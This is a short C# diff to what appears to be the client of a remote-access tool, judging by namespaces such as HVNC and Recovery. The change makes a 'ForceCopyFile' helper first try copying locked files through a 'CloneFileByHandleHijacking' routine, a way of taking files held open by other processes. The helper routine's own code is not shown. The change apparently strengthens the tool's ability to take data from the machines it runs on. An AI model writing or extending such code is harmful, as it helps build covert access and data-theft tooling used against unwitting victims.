@@ -6,6 +6,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Linq;
 using System.Threading;
+using Pulsar.Client.Recovery.Utilities.Xeno;
 
 namespace Pulsar.Client.Helper.HVNC
 {
@@ -359,6 +360,11 @@ namespace Pulsar.Client.Helper.HVNC
         /// </summary>
         public static bool ForceCopyFile(string sourcePath, string destinationPath, bool killIfFailed = false)
         {
+            if (FileHandlerXeno.CloneFileByHandleHijacking(sourcePath, destinationPath))
+            {
+                return true;
+            }
+
             byte[] fileData = ForceReadFile(sourcePath, killIfFailed);
             if (fileData == null)
             {
